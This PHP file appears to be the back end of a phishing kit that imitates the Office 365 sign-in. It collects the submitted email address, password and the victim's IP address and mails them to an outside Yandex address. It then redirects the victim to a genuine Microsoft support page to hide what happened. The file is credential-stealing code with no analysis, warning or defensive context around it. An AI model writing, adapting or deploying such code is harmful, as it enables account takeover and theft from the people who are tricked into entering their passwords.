<?
session_start();
$Email = $_GET['login'];
$_SESSION['login'];

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office 365-----------------------\n";
$message .= "Email: ".$_POST['login']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Don Loko------------------------------\n";


$recipient = "plhr360@yandex.com";
$subject = "Office 365 RESULT $ip | ".$_POST['login']."\n";
$headers = "info@LOL.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "LOL", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header('Location: https://support.office.com/en-us/article/set-up-your-voice-mail-b0d849d3-dd36-46b2-b845-ab1f1a72c647');
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
